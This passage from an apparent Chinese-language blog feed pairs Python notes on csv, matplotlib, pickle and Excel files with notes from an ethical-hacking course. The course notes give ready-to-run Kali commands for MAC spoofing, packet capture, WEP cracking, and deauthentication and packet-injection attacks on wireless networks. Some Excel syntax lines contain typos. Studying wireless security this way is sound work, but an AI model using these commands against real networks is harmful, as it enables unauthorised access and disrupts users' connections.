file:</span><br><span class="line">    writefile=csv.DictWriter(file,fieldnames=listh)</span><br><span class="line">    writefile.writeheader()</span><br><span class="line">    for data in listd:</span><br><span class="line">        writefile.writerow(data)</span><br></pre></td></tr></table></figure><blockquote><p>中文讀取:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;out2_11_4.csv&#x27;</span><br><span class="line">with open(fn,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">    datas=csv.DictReader(file)</span><br><span class="line">    for data in datas:</span><br><span class="line">        print(data)</span><br></pre></td></tr></table></figure><h4 id="csv專案-使用csv繪製氣象圖表"><a href="#csv專案-使用csv繪製氣象圖表" class="headerlink" title="csv專案(使用csv繪製氣象圖表)"></a>csv專案(使用csv繪製氣象圖表)</h4><blockquote><p>讀取檔案資料(標題):</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    print(header)</span><br></pre></td></tr></table></figure><blockquote><p>列出標題相對索引</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    heard=next(datas)</span><br><span class="line">    for data in enumerate(heard):</span><br><span class="line">        print(data)</span><br><span class="line">    for n,d in enumerate(heard):</span><br><span class="line">        print(n,d)</span><br></pre></td></tr></table></figure><blockquote><p>讀取最高溫和最低溫</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    heard=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    highTemps=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(data[3])</span><br><span class="line">        highTemps.append(data[1])</span><br><span class="line">print(&#x27;高溫:&#x27;,highTemps)</span><br><span class="line">print(&#x27;低溫:&#x27;,lowTemps)</span><br></pre></td></tr></table></figure><blockquote><p>繪製最低溫圖</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(int(data[3]))</span><br><span class="line">plt.plot(lowTemps)</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=14)</span><br><span class="line">plt.ylabel(&#x27;Temperature(c)&#x27;,fontsize=14)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=12,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>設定繪圖區大小</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(int(data[3]))</span><br><span class="line">plt.figure(dpi=80,figsize=(12,15)) #長:80*12 寬:80*15 </span><br><span class="line">plt.plot(lowTemps)</span><br><span class="line">plt.title(&quot;Weather Report, Jan. 2017&quot;,fontsize=24)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>日期格式</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">date=datetime.strptime(&#x27;2024/02/05 20:30:30&#x27;,&#x27;%Y/%m/%d %H:%M:%S&#x27;)</span><br><span class="line">print(date)</span><br></pre></td></tr></table></figure><blockquote><p>在圖表上加入日期格式</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    date=[]</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(int(data[3]))</span><br><span class="line">        date.append(datetime.strptime(data[0],&#x27;%Y/%m/%d&#x27;))</span><br><span class="line">plt.figure(dpi=80,figsize=(12,8))</span><br><span class="line">plt.plot(date,lowTemps)</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>日期旋轉</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    date=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        lowTemps.append(int(data[3]))</span><br><span class="line">        date.append(datetime.strptime(data[0],&#x27;%Y/%m/%d&#x27;))</span><br><span class="line">fig=plt.figure(dpi=80,figsize=(12,8))</span><br><span class="line">plt.plot(date,lowTemps)</span><br><span class="line">fig.autofmt_xdate() #可用rotation=n 來設定度數</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>繪製高低溫圖</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    highTemps=[]</span><br><span class="line">    date=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        try:</span><br><span class="line">            a=int(data[3])</span><br><span class="line">            b=int(data[1])</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;有缺值&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            lowTemps.append(a)</span><br><span class="line">            highTemps.append(b)</span><br><span class="line">            date.append(datetime.strptime(data[0],&#x27;%Y/%m/%d&#x27;))</span><br><span class="line">fig=plt.figure(dpi=80,figsize=(12,8))</span><br><span class="line">plt.plot(date,highTemps,color=&#x27;r&#x27;)</span><br><span class="line">plt.plot(date,lowTemps,color=&#x27;b&#x27;)</span><br><span class="line">fig.autofmt_xdate(rotation=60)</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24,color=&#x27;b&#x27;)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><blockquote><p>填滿中間區塊</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">fn=&#x27;TaipeiWeatherJan.csv&#x27;</span><br><span class="line">with open(fn) as file:</span><br><span class="line">    datas=csv.reader(file)</span><br><span class="line">    header=next(datas)</span><br><span class="line">    lowTemps=[]</span><br><span class="line">    highTemps=[]</span><br><span class="line">    date=[]</span><br><span class="line">    for data in datas:</span><br><span class="line">        try:</span><br><span class="line">            a=int(data[3])</span><br><span class="line">            b=int(data[1])</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;有缺值&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            lowTemps.append(a)</span><br><span class="line">            highTemps.append(b)</span><br><span class="line">            date.append(datetime.strptime(data[0],&#x27;%Y/%m/%d&#x27;))</span><br><span class="line">fig=plt.figure(dpi=80,figsize=(12,8))</span><br><span class="line">plt.plot(date,highTemps,color=&#x27;r&#x27;)</span><br><span class="line">plt.plot(date,lowTemps,color=&#x27;b&#x27;)</span><br><span class="line">plt.fill_between(date,highTemps,lowTemps,color=&#x27;y&#x27;,alpha=0.1) #alpha透明度0.1</span><br><span class="line">fig.autofmt_xdate(rotation=60)</span><br><span class="line">plt.title(&#x27;Weather Report, Jan. 2017&#x27;,fontsize=24,color=&#x27;b&#x27;)</span><br><span class="line">plt.xlabel(&#x27;&#x27;,fontsize=12)</span><br><span class="line">plt.ylabel(&#x27;Temperature (C)&#x27;,fontsize=12)</span><br><span class="line">plt.tick_params(axis=&#x27;both&#x27;,labelsize=14,color=&#x27;red&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a><strong>pickle</strong></h3><blockquote><p>寫入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;name&#x27;:&#x27;a&#x27;,</span><br><span class="line">    &#x27;age&#x27;:&#x27;20&#x27;,</span><br><span class="line">    &#x27;high&#x27;:200,</span><br><span class="line">    &#x27;data&#x27;:[1,2,3,4,5,6,67]</span><br><span class="line">&#125;</span><br><span class="line">fn=&#x27;ch2_23_2.dat&#x27;</span><br><span class="line">with open(fn,&#x27;wb&#x27;) as file:</span><br><span class="line">    pickle.dump(data,file)</span><br></pre></td></tr></table></figure><blockquote><p>讀取</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">fn=&#x27;ch2_23_2.dat&#x27;</span><br><span class="line">with open(fn,&#x27;rb&#x27;) as file:</span><br><span class="line">    datas=pickle.load(file)</span><br><span class="line">    print(datas)</span><br><span class="line">    print(datas[&#x27;data&#x27;][2])</span><br></pre></td></tr></table></figure><h3 id="python與Microsoft-Excel"><a href="#python與Microsoft-Excel" class="headerlink" title="python與Microsoft Excel"></a><strong>python與Microsoft Excel</strong></h3><h4 id="安裝模組"><a href="#安裝模組" class="headerlink" title="安裝模組"></a>安裝模組</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install xlwt</span><br></pre></td></tr></table></figure><h4 id="基本功能-寫入"><a href="#基本功能-寫入" class="headerlink" title="基本功能(寫入)"></a>基本功能(寫入)</h4><blockquote><p>建立活頁簿</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">活頁簿物件=xlwt.Workbook</span><br></pre></td></tr></table></figure><blockquote><p>建立工作表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工作物件=活頁簿物件.add_sheet(sheet,cell_overwrite_ok=True)   #第二個參數為True，表示可以重設Excel的儲存格內容</span><br></pre></td></tr></table></figure><blockquote><p>將資料寫入儲存格</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工作物件.write(row,col,data)   #將data寫入(row,col)位置</span><br></pre></td></tr></table></figure><h4 id="實作-寫入"><a href="#實作-寫入" class="headerlink" title="實作(寫入)"></a>實作(寫入)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import xlwt</span><br><span class="line">fn=&#x27;out2_25_2.xls&#x27;</span><br><span class="line">data=[&#x27;iphone 13&#x27;,&#x27;iphone 14&#x27;,&#x27;iphone 15&#x27;]</span><br><span class="line">price=[&#x27;10000&#x27;,&#x27;20000&#x27;,&#x27;30000&#x27;]</span><br><span class="line">excel=xlwt.Workbook()</span><br><span class="line">sh=excel.add_sheet(&#x27;phone&#x27;,cell_overwrite_ok=True)</span><br><span class="line">for i in range(len(data)):</span><br><span class="line">    sh.write(0,i,data[i])</span><br><span class="line">for j in range(len(price)):</span><br><span class="line">    sh.write(1,j,price[j])</span><br><span class="line">excel.save(fn)</span><br></pre></td></tr></table></figure><h4 id="基本功能-讀取"><a href="#基本功能-讀取" class="headerlink" title="基本功能(讀取)"></a>基本功能(讀取)</h4><blockquote><p>開啟excel檔案供讀取</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">活頁簿件=xlrd.open.workbook()</span><br></pre></td></tr></table></figure><blockquote><p>建立工作物件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工作物件=活頁簿物件.sheet()[index]   #上述傳回指定工作表的物件</span><br></pre></td></tr></table></figure><blockquote><p>傳回工作表row數</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">row=工作表物件.nrows</span><br></pre></td></tr></table></figure><blockquote><p>傳回工作表的col數</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cols=工作表物件.ncols</span><br></pre></td></tr></table></figure><blockquote><p>讀取某rows的數據</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list_data=工作表物件.row_valies(rows)  #將指定工作表的rows的值已串列格式回傳給list_data</span><br></pre></td></tr></table></figure><h4 id="實作-讀取"><a href="#實作-讀取" class="headerlink" title="實作(讀取)"></a>實作(讀取)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import xlrd</span><br><span class="line"></span><br><span class="line">fn=&#x27;out2_25_2.xls&#x27;</span><br><span class="line">excel=xlrd.open_workbook(fn)</span><br><span class="line">sh=excel.sheets()[0]</span><br><span class="line">n=sh.nrows</span><br><span class="line">for i in range(n):</span><br><span class="line">    print(sh.row_values(i))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python網路爬蟲 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 筆記 </tag>
            
            <tag> python </tag>
            
            <tag> 網路爬蟲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learn Ethical Hacking From Scratch</title>
      <link href="/2024/01/25/Ethical%20Hacking/"/>
      <url>/2024/01/25/Ethical%20Hacking/</url>
      
        <content type="html"><![CDATA[<h1 id="Learn-Ethical-Hacking-From-Scratch"><a href="#Learn-Ethical-Hacking-From-Scratch" class="headerlink" title="Learn Ethical Hacking From Scratch"></a>Learn Ethical Hacking From Scratch</h1><h2 id="Setting-Up-The-Lab"><a href="#Setting-Up-The-Lab" class="headerlink" title="Setting Up The Lab"></a><strong>Setting Up The Lab</strong></h2><h3 id="資源安裝連結"><a href="#資源安裝連結" class="headerlink" title="資源安裝連結"></a><strong>資源安裝連結</strong></h3><h4 id="Kali-linux下載"><a href="#Kali-linux下載" class="headerlink" title="Kali linux下載"></a><strong>Kali linux下載</strong></h4><blockquote><p>下載連結: <a href="https://zsecurity.org/download-custom-kali/">https://zsecurity.org/download-custom-kali/</a></p></blockquote><h4 id="Kali-linux更新指令"><a href="#Kali-linux更新指令" class="headerlink" title="Kali linux更新指令"></a><strong>Kali linux更新指令</strong></h4><blockquote><p>資料庫更新指令:apt-get update<br>軟體更新指令:apt-get install &lt;terminator&gt;</p></blockquote><h4 id="Kali-linux指令相關網站"><a href="#Kali-linux指令相關網站" class="headerlink" title="Kali linux指令相關網站"></a><strong>Kali linux指令相關網站</strong></h4><blockquote><p>常用指令集: <a href="https://www.mediacollege.com/linux/command/linux-command.html">Linux Commands</a><br>用法解說網站: <a href="https://explainshell.com/">explainshell.com</a></p></blockquote><h2 id="Network-Basices"><a href="#Network-Basices" class="headerlink" title="Network Basices"></a><strong>Network Basices</strong></h2><h3 id="課程所需網卡推薦"><a href="#課程所需網卡推薦" class="headerlink" title="課程所需網卡推薦"></a><strong>課程所需網卡推薦</strong></h3><h4 id="Kali-linux監聽功能網卡推薦"><a href="#Kali-linux監聽功能網卡推薦" class="headerlink" title="Kali linux監聽功能網卡推薦"></a><strong>Kali linux監聽功能網卡推薦</strong></h4><iframe width="560" height="315" src="https://www.youtube.com/embed/0lqRZ3MWPXY?si=Uo1r7Y8PKW3DjRuq" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><h4 id="Kali-linux監聽功能網卡商店"><a href="#Kali-linux監聽功能網卡商店" class="headerlink" title="Kali linux監聽功能網卡商店"></a><strong>Kali linux監聽功能網卡商店</strong></h4><blockquote><p>網址: <a href="https://zsecurity.org/shop/">zsecurity shop</a></p></blockquote><h3 id="網卡設定"><a href="#網卡設定" class="headerlink" title="網卡設定"></a><strong>網卡設定</strong></h3><h4 id="查詢網路介面資訊"><a href="#查詢網路介面資訊" class="headerlink" title="查詢網路介面資訊"></a><strong>查詢網路介面資訊</strong></h4><blockquote><p>指令: ifconfig<br>只查看無線接口指令: iwconfig</p></blockquote><h4 id="查詢無線網路網卡"><a href="#查詢無線網路網卡" class="headerlink" title="查詢無線網路網卡"></a><strong>查詢無線網路網卡</strong></h4><blockquote><p>指令: iwconfig</p></blockquote><h4 id="更改MAC網卡位置"><a href="#更改MAC網卡位置" class="headerlink" title="更改MAC網卡位置"></a><strong>更改MAC網卡位置</strong></h4><blockquote><p>step 1: ifconfig wlan0 down<br>step 2: ifconfig wlan0 hw ether 00:11:22:33:44:55<br>step 3: ifconfig wlan0 up</p></blockquote><h4 id="啟用網卡監聽模式"><a href="#啟用網卡監聽模式" class="headerlink" title="啟用網卡監聽模式"></a><strong>啟用網卡監聽模式</strong></h4><blockquote><p>step 1: ifconfig wlan0 down<br>step 2: airmon-ng check kill (停止網路管理器運行程序)<br>step 3: iwconfig wlan0 mode monitor<br>step 4: ifconfig wlan0 up</p></blockquote><h4 id="啟用網卡監聽模式-其他方法"><a href="#啟用網卡監聽模式-其他方法" class="headerlink" title="啟用網卡監聽模式(其他方法)"></a><strong>啟用網卡監聽模式(其他方法)</strong></h4><iframe width="560" height="315" src="https://www.youtube.com/embed/wiIoR_0epvs?si=Fm4LygIfdqSBlcvB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><blockquote><p><strong>note:</strong></p><ol><li>網卡的MAC位置設定建議開頭為00</li><li>手動更卡網卡位置在重新開機時將還原</li></ol></blockquote><h2 id="Pre-Connection-Attacks"><a href="#Pre-Connection-Attacks" class="headerlink" title="Pre-Connection Attacks"></a><strong>Pre-Connection Attacks</strong></h2><h3 id="監聽取得封包"><a href="#監聽取得封包" class="headerlink" title="監聽取得封包"></a><strong>監聽取得封包</strong></h3><h4 id="選擇尋找目標"><a href="#選擇尋找目標" class="headerlink" title="選擇尋找目標"></a><strong>選擇尋找目標</strong></h4><blockquote><p>指令(不包含5G頻段網路): airodump-ng &lt;wlan0&gt;<br>指令(5G頻段網路，a頻段) : airodump-ng –band a &lt;wlan0&gt;<br>指令(混和頻段網路) : airodump-ng –band abg &lt;wlan0&gt;<br>選擇目標記錄下他的bssid、channel</p></blockquote><h4 id="對目標實施監聽並取得封包"><a href="#對目標實施監聽並取得封包" class="headerlink" title="對目標實施監聽並取得封包"></a><strong>對目標實施監聽並取得封包</strong></h4><blockquote><p>指令: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0</p></blockquote><h3 id="WEP破解"><a href="#WEP破解" class="headerlink" title="WEP破解"></a><strong>WEP破解</strong></h3><blockquote><p>step 1: 累積封包到一定數目<br>step 2: aircrack-ng 檔案名.cap<br><img src="/photo/Ethical_Hacking/1.jpg" alt="1"><br>密碼:將(1)的冒號刪除輸入或輸入(2)</p></blockquote><h3 id="快速累積封包"><a href="#快速累積封包" class="headerlink" title="快速累積封包"></a><strong>快速累積封包</strong></h3><h4 id="aireplay-ng去認證攻擊"><a href="#aireplay-ng去認證攻擊" class="headerlink" title="aireplay-ng去認證攻擊"></a><strong>aireplay-ng去認證攻擊</strong></h4><blockquote><p>指令: aireplay-ng –deauth 攻擊次數 -a 目標網路MAC -c 目標客戶機MAC wlan0</p></blockquote><h4 id="aireplay-ng假認證攻擊"><a href="#aireplay-ng假認證攻擊" class="headerlink" title="aireplay-ng假認證攻擊"></a><strong>aireplay-ng假認證攻擊</strong></h4><blockquote><p>指令: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0</p></blockquote><h4 id="Packet-Injection-ARP-Request-Reply-Attack"><a href="#Packet-Injection-ARP-Request-Reply-Attack" class="headerlink" title="Packet Injection - ARP Request Reply Attack"></a><strong>Packet Injection - ARP Request Reply Attack</strong></h4><blockquote><p>說明 : 迫使連結接入點生成具有新的IV的封包<br>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –arpreplay -b 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br><img src="/photo/Ethical_Hacking/2.jpg" alt="2"></p></blockquote><h4 id="Packet-Injection-Korek-Chopchop-Attack"><a href="#Packet-Injection-Korek-Chopchop-Attack" class="headerlink" title="Packet Injection - Korek Chopchop Attack"></a><strong>Packet Injection - Korek Chopchop Attack</strong></h4><blockquote><p>說明 : 嘗試確定密鑰流<br>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –chopchop -b 目標網路MAC -h 自己網卡的MAC<br>等待終端C跳出是否解密(y)<br><img src="/photo/Ethical_Hacking/3.jpg" alt="3"><br>解密完後，終端C:<br><img src="/photo/Ethical_Hacking/4.jpg" alt="4"></p></blockquote><blockquote><p><strong>note:</strong><br>y後面接的是解密後的檔案名</p></blockquote><blockquote><p>終端C注入:<br><img src="/photo/Ethical_Hacking/5.jpg" alt="5"></p></blockquote><h4 id="Packet-Injection-Fragmentation-Attack"><a href="#Packet-Injection-Fragmentation-Attack" class="headerlink" title="Packet Injection - Fragmentation Attack"></a><strong>Packet Injection - Fragmentation Attack</strong></h4><blockquote><p>說明 : 偽造封包注入</p><blockquote><p>終端A: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B: aireplay-ng –fakeauth 0 -a 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) wlan0<br>終端C: aireplay-ng –fragment -b 目標網路MAC -h 自己網卡的MAC位置(前 6 byte) 